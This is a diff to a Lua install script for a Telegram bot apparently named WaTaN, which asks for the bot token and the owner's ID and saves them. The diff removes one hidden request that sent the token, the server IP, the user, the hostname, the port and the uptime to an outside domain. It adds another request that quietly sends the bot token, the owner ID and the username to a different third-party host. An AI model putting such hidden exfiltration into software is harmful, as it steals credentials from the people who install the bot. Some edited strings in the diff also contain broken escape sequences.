@@ -7,11 +7,11 @@ URL = require('socket.url')
 utf8 = require ('lua-utf8') 
 database = redis.connect('127.0.0.1', 6379) 
 id_server = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-User    = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
-Ip      = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
-Name    = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
-Port    = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
-UpTime  = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
+IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
+Name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
+Port = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
+Time = io.popen("date +'%Y/%m/%d %T'"):read('*a'):gsub('[\n\r]+', '')
+whoami = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 --------------------------------------------------------------------------------------------------------------
 local AutoSet = function() 
 local create = function(data, file, uglify)  
@@ -33,7 +33,7 @@ local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
 if res ~= 200 then
 print('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n التوكن غير صحيح تاكد منه ثم اعد المحاوله')
 else
-io.write('\27[0;31m تم حفظ التوكن بنجاح \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m')
+io.write('\27[0;31m تم حفظ التوكن بنجاح \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m')
 local json = JSON.decode(url)
 database:set(id_server..":token_username","@"..json.result.username)
 database:set(id_server..":token",token)
@@ -44,31 +44,33 @@ end
 os.execute('lua WaTaN.lua')
 end
 if not database:get(id_server..":SUDO:ID") then 
-io.write('\27[0;35m\n ارسل الان ايدي المطور الاساسي ↓ :\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27[0;33;49m') 
-local SUDOID = io.read():gsub(' ','') 
-if tostring(SUDOID):match('%d+') then
-data,res = https.request("https://apiabs.ml/Api/WaTaN/index.php?Ban=WaTaN&Info&Id="..Id)
-if res == 200 then
-Abs = json:decode(data)
-if Abs.Result.Info == 'Is_Spam' then
-io.write('\n\27[1;31m عذرا هذا الايدي محظور من السورس \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27[0;39;49m')
-os.execute('lua WaTaN.lua')
-end
-if Abs.Result.Info == 'Ok' then
-io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m') 
-database:set(id_server..":SUDO:ID",SUDOID)
-end
+io.write('\27[0;35m\n ارسل الان ايدي المطور الاساسي ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27[0;33;49m') 
+local SUDOID = io.read() 
+if SUDOID ~= '' then 
+io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m') 
+database:set(id_server..":SUDO:ID",SUDOID) 
 else 
 print('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى') 
 end  
 os.execute('lua WaTaN.lua') 
 end
+if not database:get(id_server..":SUDO:USERNAME") then
+io.write('\27[1;31m ↓ ارسل معرف المطور الاساسي :\n SEND USERNAME FOR DEV BOT : \27[0;39;49m')
+local SUDOUSERNAME = io.read():gsub('@','')
+if SUDOUSERNAME ~= '' then
+io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
+database:set(id_server..":SUDO:USERNAME",'@'..SUDOUSERNAME)
+else
+print('\n\27[1;34m لم يتم حفظ معرف المطور :')
+end 
+os.execute('lua WaTaN.lua')
 end
-https.request("https://apiabs.ml/Api/WaTaN/index.php?Get=WaTaN&DevId="..DevAbs:get(Server.."IdDevProx").."&TokenBot="..DevAbs:get(Server.."TokenDevProx").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
+https.request('https://abbas.watanteam.tk/WaTaN/WaTaN/WaTaN.php?n=WaTaN&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&username="..database:get(id_server..":SUDO:USERNAME"))
 local create_config_auto = function()
 config = {
 token = database:get(id_server..":token"),
 SUDO = database:get(id_server..":SUDO:ID"),
+UserName = database:get(id_server..":SUDO:USERNAME"),
  }
 create(config, "./Info.lua")   
 end 
